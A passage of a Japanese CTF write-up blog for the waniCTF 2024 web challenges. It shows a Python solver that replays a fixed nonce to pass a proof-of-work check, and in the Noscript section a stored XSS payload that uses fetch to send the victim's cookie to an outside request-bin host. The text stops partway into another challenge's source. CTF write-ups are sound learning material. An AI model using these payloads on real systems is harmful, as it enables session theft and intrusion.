@@ -1,0 +1,472 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[waniCTF 2024] writeup(web) - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="[web] Bad_Worker https://web-bad-worker-lz56g6.wanictf.org/fetchdata からflagを取得しようとすると、dummyのflagが取得されます。
+service-worker.jsで動作するService Workerがリクエストを改竄しているようです。
+async function onFetch(event) { let cachedResponse = null; if (event.request.method === 'GET') { const shouldServeIndexHtml = event.request.mode === 'navigate'; let request = event.request; if (request.url.toString().includes(&#34;FLAG.txt&#34;)) { request = &#34;DUMMY.txt&#34;; } if (shouldServeIndexHtml) { request = &#34;index.html&#34; } return fetch(request); } return cachedResponse || fetch(event.request); } 直接バックエンドのAPIを叩いてflagを取得します。
+$ curl &#34;https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt&#34; FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1} [web] pow なんかめっちゃ計算してる雰囲気が出ています。
+ページソースは以下です。期待するハッシュ値が計算できたら、バックエンドに提出します。
+<!DOCTYPE html> <html> <head> <title>POW Client</title> </head> <body> <h1>Proof of Work</h1> <p>Calculate hashes to get the flag!"><meta property="og:image" content><meta property="og:title" content="[waniCTF 2024] writeup(web)"><meta property="og:description" content="[web] Bad_Worker https://web-bad-worker-lz56g6.wanictf.org/fetchdata からflagを取得しようとすると、dummyのflagが取得されます。
+service-worker.jsで動作するService Workerがリクエストを改竄しているようです。
+async function onFetch(event) { let cachedResponse = null; if (event.request.method === 'GET') { const shouldServeIndexHtml = event.request.mode === 'navigate'; let request = event.request; if (request.url.toString().includes(&#34;FLAG.txt&#34;)) { request = &#34;DUMMY.txt&#34;; } if (shouldServeIndexHtml) { request = &#34;index.html&#34; } return fetch(request); } return cachedResponse || fetch(event.request); } 直接バックエンドのAPIを叩いてflagを取得します。
+$ curl &#34;https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt&#34; FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1} [web] pow なんかめっちゃ計算してる雰囲気が出ています。
+ページソースは以下です。期待するハッシュ値が計算できたら、バックエンドに提出します。
+<!DOCTYPE html> <html> <head> <title>POW Client</title> </head> <body> <h1>Proof of Work</h1> <p>Calculate hashes to get the flag!"><meta property="og:type" content="article"><meta property="og:url" content="/posts/45/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-23T22:24:58+09:00"><meta property="article:modified_time" content="2024-06-23T22:24:58+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[waniCTF 2024] writeup(web)"><meta name=twitter:description content="[web] Bad_Worker https://web-bad-worker-lz56g6.wanictf.org/fetchdata からflagを取得しようとすると、dummyのflagが取得されます。
+service-worker.jsで動作するService Workerがリクエストを改竄しているようです。
+async function onFetch(event) { let cachedResponse = null; if (event.request.method === 'GET') { const shouldServeIndexHtml = event.request.mode === 'navigate'; let request = event.request; if (request.url.toString().includes(&#34;FLAG.txt&#34;)) { request = &#34;DUMMY.txt&#34;; } if (shouldServeIndexHtml) { request = &#34;index.html&#34; } return fetch(request); } return cachedResponse || fetch(event.request); } 直接バックエンドのAPIを叩いてflagを取得します。
+$ curl &#34;https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt&#34; FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1} [web] pow なんかめっちゃ計算してる雰囲気が出ています。
+ページソースは以下です。期待するハッシュ値が計算できたら、バックエンドに提出します。
+<!DOCTYPE html> <html> <head> <title>POW Client</title> </head> <body> <h1>Proof of Work</h1> <p>Calculate hashes to get the flag!"><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[waniCTF 2024] writeup(web)</h1><div class=meta>Posted on Jun 23, 2024</div></div><nav id=TableOfContents><ol><li><a href=#web-bad_worker>[web] Bad_Worker</a></li><li><a href=#web-pow>[web] pow</a></li><li><a href=#web-noscript>[web] Noscript</a></li><li><a href=#web-one-day-one-letter>[web] One Day One Letter</a></li><li><a href=#web-elec>[web] elec</a></li><li><a href=#おわりに>おわりに</a></li></ol></nav><section class=body><h1 id=web-bad_worker>[web] Bad_Worker</h1><p><a href=https://web-bad-worker-lz56g6.wanictf.org/fetchdata>https://web-bad-worker-lz56g6.wanictf.org/fetchdata</a> からflagを取得しようとすると、dummyのflagが取得されます。</p><p><img src=/images/posts/45/dummy_flag.png alt=dummy></p><p><code>service-worker.js</code>で動作するService Workerがリクエストを改竄しているようです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>onFetch</span>(<span style=color:#a6e22e>event</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cachedResponse</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>method</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;GET&#39;</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>shouldServeIndexHtml</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>mode</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;navigate&#39;</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>request</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>toString</span>().<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#34;FLAG.txt&#34;</span>)) {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;DUMMY.txt&#34;</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>shouldServeIndexHtml</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.html&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>  <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>request</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>cachedResponse</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>request</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>直接バックエンドのAPIを叩いてflagを取得します。</p><pre tabindex=0><code>$ curl &#34;https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt&#34;
+FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1}
+</code></pre><h1 id=web-pow>[web] pow</h1><p>なんかめっちゃ計算してる雰囲気が出ています。</p><p><img src=/images/posts/45/pow.png alt=pow></p><p>ページソースは以下です。期待するハッシュ値が計算できたら、バックエンドに提出します。</p><pre tabindex=0><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;POW Client&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Proof of Work&lt;/h1&gt;
+    &lt;p&gt;Calculate hashes to get the flag!&lt;/p&gt;
+    &lt;p&gt;Client status: &lt;span id=&#34;client-status&#34;&gt;(no status yet)&lt;/span&gt;&lt;/p&gt;
+    &lt;p&gt;Server response: &lt;span id=&#34;server-response&#34;&gt;(no hash sent yet)&lt;/span&gt;&lt;/p&gt;
+    &lt;script
+      src=&#34;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js&#34;
+      integrity=&#34;sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==&#34;
+      crossorigin=&#34;anonymous&#34;
+      referrerpolicy=&#34;no-referrer&#34;
+    &gt;&lt;/script&gt;
+    &lt;script&gt;
+       function hash(input) {
+        let result = input;
+        for (let i = 0; i &lt; 10; i++) {
+          result = CryptoJS.SHA256(result);
+        }
+        return (result.words[0] &amp; 0xFFFFFF00) === 0;
+      }
+      async function send(array) {
+        document.getElementById(&#34;server-response&#34;).innerText = await fetch(
+          &#34;/api/pow&#34;,
+          {
+            method: &#34;POST&#34;,
+            headers: {
+              &#34;Content-Type&#34;: &#34;application/json&#34;,
+            },
+            body: JSON.stringify(array),
+          }
+        ).then((r) =&gt; r.text());
+      }
+      let i = BigInt(localStorage.getItem(&#34;pow_progress&#34;) || &#34;0&#34;);
+      async function main() {
+        await send([]);
+        async function loop() {
+          document.getElementById(
+            &#34;client-status&#34;
+          ).innerText = `Checking ${i.toString()}...`;
+          localStorage.setItem(&#34;pow_progress&#34;, i.toString());
+          for (let j = 0; j &lt; 1000; j++) {
+            i++;
+            if (hash(i.toString())) {
+              await send([i.toString()]);
+            }
+          }
+          requestAnimationFrame(loop);
+        }
+        loop();
+      }
+      main();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>ブラウザの<code>Network</code>タブを見ると、確かにハッシュを提出しています。</p><p><img src=/images/posts/45/hash.png alt=hash></p><p><code>progress</code>も進んでいます。1000000に達するとflagが取得できそうです。</p><p><img src=/images/posts/45/progress.png alt=progress></p><p>試しに、求まったハッシュを配列に100個入れて送ると、<code>progress</code>が100進みました。</p><p>10000個の固定ハッシュ値を入れた配列を100回送信すると、<code>progress</code>が1000000になりflagが取得できそうです。たまにrate limitに達するので気長に待ちます。</p><pre tabindex=0><code>import requests
+import time
+
+hash_value = &#34;7844289&#34;
+payload = [hash_value for _ in range(10000)]
+
+# ヘッダーの設定
+headers = {
+    &#34;Content-Type&#34;: &#34;application/json&#34;,
+    &#34;Cookie&#34;: &#34;pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiI2Y2I4MjZhNy0xMTRhLTQxOWEtYjg2OC1hYjZkOTlkM2UyZWQifQ.TdIHAJ7BvWSDkNnHWCeIMRa4gffEBurLit_JlHAo24w&#34;
+}
+
+def send_request():
+    response = requests.post(&#34;https://web-pow-lz56g6.wanictf.org/api/pow&#34;, json=payload, headers=headers)
+    return response.text
+
+def main():
+    for _ in range(100):
+        try:
+            time.sleep(10)
+            response = send_request()
+            print(response)
+        except Exception as e:
+            print(f&#34;Error: {e}&#34;)
+
+if __name__ == &#34;__main__&#34;:
+    main()
+</code></pre><pre tabindex=0><code>% python3 solver.py 
+progress: 950000 / 1000000
+progress: 960000 / 1000000
+progress: 970000 / 1000000
+progress: 980000 / 1000000
+progress: 990000 / 1000000
+FLAG{N0nCE_reusE_i$_FUn}
+</code></pre><h1 id=web-noscript>[web] Noscript</h1><p>ユーザープロフィール画面で<code>Username</code>と<code>Profile</code>を指定でき、指定のパスを報告するとクローラーが訪問するwebアプリのようです。</p><p><img src=/images/posts/45/noscript.png alt=noscript>
+<img src=/images/posts/45/noscript2.png alt=noscript2></p><p>クローラーはCookieにflagを持った状態で<code>https://web-noscript-lz56g6.wanictf.org/[指定のパス]</code>にアクセスします。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crawl</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>path</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>browser</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>chromium</span>.<span style=color:#a6e22e>launch</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>page</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>newPage</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cookie</span> <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;flag&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>value</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>FLAG</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>domain</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>HOST</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>path</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;/&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>expires</span><span style=color:#f92672>:</span> Date.<span style=color:#a6e22e>now</span>() <span style=color:#f92672>/</span> <span style=color:#ae81ff>1000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>100000</span>,
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>  ];
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>context</span>().<span style=color:#a6e22e>addCookies</span>(<span style=color:#a6e22e>cookie</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>APP_URL</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>path</span>, {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;domcontentloaded&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>,
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>waitForTimeout</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#34;crawl&#34;</span>, <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>message</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>finally</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;crawl&#34;</span>, <span style=color:#e6db74>&#34;browser closed&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>XSSでcookieに含まれるflagを取得する問題だと予想できます。</p><p>XSSは<code>app/main.go</code>の<code>GET:/user/:id</code>にあります。<code>profile</code>に指定した値をHTMLとして返します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#75715e>// Get user profiles
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/user/:id&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Header</span>(<span style=color:#e6db74>&#34;Content-Security-Policy&#34;</span>, <span style=color:#e6db74>&#34;default-src &#39;self&#39;, script-src &#39;none&#39;&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Param</span>(<span style=color:#e6db74>&#34;id&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>re</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>&#34;^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>re</span>.<span style=color:#a6e22e>MatchString</span>(<span style=color:#a6e22e>id</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>val</span>, <span style=color:#a6e22e>ok</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>Get</span>(<span style=color:#a6e22e>id</span>); <span style=color:#a6e22e>ok</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>params</span> <span style=color:#f92672>:=</span> <span style=color:#66d9ef>map</span>[<span style=color:#66d9ef>string</span>]<span style=color:#66d9ef>interface</span>{}{
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;id&#34;</span>:       <span style=color:#a6e22e>id</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#a6e22e>val</span>[<span style=color:#ae81ff>0</span>],
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;profile&#34;</span>:  <span style=color:#a6e22e>template</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>val</span>[<span style=color:#ae81ff>1</span>]),
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;user.html&#34;</span>, <span style=color:#a6e22e>params</span>)
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> = <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Writer</span>.<span style=color:#a6e22e>WriteString</span>(<span style=color:#e6db74>&#34;&lt;p&gt;user not found &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span>)
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> = <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Writer</span>.<span style=color:#a6e22e>WriteString</span>(<span style=color:#e6db74>&#34;&lt;p&gt;invalid id &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span>)
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>})
+</span></span></code></pre></div><p><code>profile</code>にcookieを取得するJavaScriptを挿入すればflagが取得できそうですが、よく見るとCSPが設定されています。<code>default-src 'self'</code>かつ<code>script-src 'none'</code>なので、JavaScriptは挿入できなさそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Header</span>(<span style=color:#e6db74>&#34;Content-Security-Policy&#34;</span>, <span style=color:#e6db74>&#34;default-src &#39;self&#39;, script-src &#39;none&#39;&#34;</span>)
+</span></span></code></pre></div><p>実際にJavaScriptを挿入するとエラーが出ます。
+<img src=/images/posts/45/csp.png alt=csp></p><p>ここで、<code>username</code>のみを取得するエンドポイントがあることに気づきます。</p><p><code>username</code>を取得して特にエスケープ処理をかけずに返送します。こちらのエンドポイントではCSPは設定されていません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#75715e>// Get username API
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/username/:id&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Param</span>(<span style=color:#e6db74>&#34;id&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>re</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>&#34;^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>re</span>.<span style=color:#a6e22e>MatchString</span>(<span style=color:#a6e22e>id</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>val</span>, <span style=color:#a6e22e>ok</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>Get</span>(<span style=color:#a6e22e>id</span>); <span style=color:#a6e22e>ok</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> = <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Writer</span>.<span style=color:#a6e22e>WriteString</span>(<span style=color:#a6e22e>val</span>[<span style=color:#ae81ff>0</span>])
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> = <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Writer</span>.<span style=color:#a6e22e>WriteString</span>(<span style=color:#e6db74>&#34;&lt;p&gt;user not found &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span>)
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> = <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Writer</span>.<span style=color:#a6e22e>WriteString</span>(<span style=color:#e6db74>&#34;&lt;p&gt;invalid id &lt;a href=&#39;/&#39;&gt;Home&lt;/a&gt;&lt;/p&gt;&#34;</span>)
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>})
+</span></span></code></pre></div><p><code>username</code>にCookieを窃取するJavaScriptを挿入し、<code>src</code>に<code>/username:id</code>を指定したiframeを<code>profile</code>に入れることで、CSPが<code>default-src 'self', script-src 'none'</code>のもとでもflagが取得できそうです。</p><pre tabindex=0><code>Username: &lt;script&gt;fetch(`https://[yours].m.pipedream.net?cookie=${document.cookie}`)&lt;/script&gt;
+
+Profile: &lt;iframe src=&#34;/username/41b3e2c5-8a30-4f4c-8b98-02d4e08a57c4&#34;&gt;
+</code></pre><p><code>/user/e89c6fe2-3c94-49db-8a9c-1c795ffc300b</code>をクローラーに送信するとRequestBinにflagが送信されます。</p><pre tabindex=0><code>flag=FLAG{n0scr1p4_c4n_be_d4nger0us}
+</code></pre><h1 id=web-one-day-one-letter>[web] One Day One Letter</h1><p>現在の時刻を元にflagを一部だけ表示するwebアプリのようです。</p><p><img src=/images/posts/45/timestamp.png alt=timestamp></p><p><code>content-server</code>と<code>time-server</code>の2つのwebサーバがあり、<code>content-server</code>は<code>time-server</code>から現在の時刻を取得します。</p><p><code>content-server/server.py</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http <span style=color:#f92672>import</span> HTTPStatus
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.request <span style=color:#f92672>import</span> Request, urlopen
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urljoin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Hash <span style=color:#f92672>import</span> SHA256
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> ECC
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Signature <span style=color:#f92672>import</span> DSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>FLAG_CONTENT <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;FLAG_CONTENT&#39;</span>, <span style=color:#e6db74>&#39;abcdefghijkl&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> len(FLAG_CONTENT) <span style=color:#f92672>==</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> all(c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz&#39;</span> <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> FLAG_CONTENT)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_pubkey_of_timeserver</span>(timeserver: str):
+</span></span><span style=display:flex><span>    req <span style=color:#f92672>=</span> Request(urljoin(<span style=color:#e6db74>&#39;https://&#39;</span> <span style=color:#f92672>+</span> timeserver, <span style=color:#e6db74>&#39;pubkey&#39;</span>))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> urlopen(req) <span style=color:#66d9ef>as</span> res:
+</span></span><span style=display:flex><span>        key_text <span style=color:#f92672>=</span> res<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> ECC<span style=color:#f92672>.</span>import_key(key_text)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag_hint_from_timestamp</span>(timestamp: int):
+</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;?&#39;</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    idx <span style=color:#f92672>=</span> timestamp <span style=color:#f92672>//</span> (<span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    content[idx] <span style=color:#f92672>=</span> FLAG_CONTENT[idx]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;FLAG{&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(content) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;}&#39;</span>
